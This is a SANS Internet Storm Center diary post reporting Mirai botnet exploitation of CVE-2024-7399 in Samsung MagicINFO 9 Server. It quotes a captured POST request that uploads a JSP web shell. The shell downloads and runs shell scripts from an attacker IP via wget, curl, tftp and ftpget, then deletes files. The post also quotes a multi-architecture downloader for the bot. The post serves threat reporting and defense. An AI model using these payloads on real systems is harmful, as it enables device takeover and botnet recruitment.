---
title: "Mirai" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)
url: https://isc.sans.edu/diary/rss/31920
source: SANS Internet Storm Center, InfoCON: green
date: 2025-05-07
fetch_date: 2025-10-06T22:30:48.580189
---

# "Mirai" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31912)
* [next](/diary/31924)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

# ["Mirai" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399)](/forums/diary/Mirai%2BNow%2BExploits%2BSamsung%2BMagicINFO%2BCMS%2BCVE20247399/31920/)

**Published**: 2025-05-05. **Last Updated**: 2025-05-06 02:10:41 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[0 comment(s)](/diary/Mirai%2BNow%2BExploits%2BSamsung%2BMagicINFO%2BCMS%2BCVE20247399/31920/#comments)

Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution [1]. The announcement was very sparse and did not even include affected systems:

> `SVP-AUG-2024
> SVE-2024-50018(CVE-2024-7399)
> Weakness : Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server allows attackers to write arbitrary file as system authority.
> Patch information : The patch modifies verification logic of the input.`

At around the same time, a CVE was assigned to the vulnerability: CVE-2024-7399. The NVD entry has a little bit more details [2]. In particular, it identifies a legacy CMS distributed by Samsung, MagicINFO 9, as the vulnerable software:

> `Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server version before 21.1050 allows attackers to write arbitrary file as system authority.`

For some reason, this vulnerability was covered in a recent article on Cybersecuritynews, providing additional details [3]:

> `According to the technical analysis, the /MagicInfo/servlet/SWUpdateFileUploader endpoint implemented by the SWUpdateFileUploadServlet class contains multiple security issues.`

Sadly, I can not find a reference to the original technical analysis or who it was performed by in Cybersecuritynews article. But we are now seeing some exploit attempts for the issue.

The POST request we are seeing is a typical "IoT Botnet" style request as we have seen many before. It first uses the magicINFO 9 vulnerability to download a script:

> `POST /MagicInfo/servlet/SWUpdateFileUploader HTTP/1.1
> User-Agent: python-requests/2.27.1
> Accept-Encoding: gzip, deflate
> Accept: */*
> Connection: keep-alive
> Content-Length: 1151
> Content-Type: multipart/form-data; boundary=4f3a72624fa5c399c5d203d3617891cb`
>
> `--4f3a72624fa5c399c5d203d3617891cb`
>
> `Content-Disposition: form-data; name="file"; filename="1746466018shell.jsp"
> Content-Type: application/octet-stream
>
> <%@ page import="java.io.*" %>
> <%
> try {
>     String[] cmd = {
>         "/bin/sh", "-c",
>         "cd /tmp; cd /var/run; cd /mnt; cd /root; cd /; "
>         + "wget http://176.65.142.122/ohshit.sh; "
>         + "curl -O http://176.65.142.122/ohshit.sh; "
>         + "chmod 777 ohshit.sh; sh ohshit.sh; "
>         + "tftp 176.65.142.122 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; "
>         + "tftp -r ohshit2.sh -g 176.65.142.122; chmod 777 ohshit2.sh; sh ohshit2.sh; "
>         + "ftpget -v -u anonymous -p anonymous -P 21 176.65.142.122 ohshit1.sh ohshit1.sh; sh ohshit1.sh; "
>         + "rm -rf ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *"
>     };
>     Process p = Runtime.getRuntime().exec(cmd);
>     BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
>     String line;
>     while ((line = reader.readLine()) != null) {
>         out.println(line);
>     }
> } catch (Exception e) {
>     out.println("Error: " + e.toString());
> }
> %>
>
> --4f3a72624fa5c399c5d203d3617891cb--`

The bash script contains the usual "multi-architecture" downloader for the act`ual bot. I am only including the first couple lines here as they repeat for different architectures:`

> `#!/bin/bash
> cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.x86; curl -O http://176.65.142.122/hiddenbin/boatnet.x86;cat boatnet.x86 >WTF;chmod +x *;./WTF
> cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.mips; curl -O http://176.65.142.122/hiddenbin/boatnet.mips;cat boatnet.mips >WTF;chmod +x *;./WTF
> cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.arc; curl -O http://176.65.142.122/hiddenbin/boatnet.arc;cat boatnet.arc >WTF;chmod +x *;./WTF`

The "botnet" bot is well recognized by Virustotal and appears to be yet another version of Mirai, which matches the download behavior [4].

[1] https://security.samsungtv.com/securityUpdates
[2] https://nvd.nist.gov/vuln/detail/CVE-2024-7399
[3] https://cybersecuritynews.com/samsung-magicinfo-vulnerability/
[4] https://www.virustotal.com/gui/file/3f26e58cd09804d9c38c6613fb976d8a680555f3eac38a46ef7f3927beaadd26

---
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords: [magicinfo](/tag.html?tag=magicinfo) [mirai](/tag.html?tag=mirai) [samsung](/tag.html?tag=samsung)

[0 comment(s)](/diary/Mirai%2BNow%2BExploits%2BSamsung%2BMagicINFO%2BCMS%2BCVE20247399/31920/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Application Security: Securing Web Apps, APIs, and Microservices](https://www.sans.org/event/dallas-2025/course/application-security-securing-web-apps-api-microservices) | Dallas | Dec 1st - Dec 6th 2025 |

* [previous](/diary/31912)
* [next](/diary/31924)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)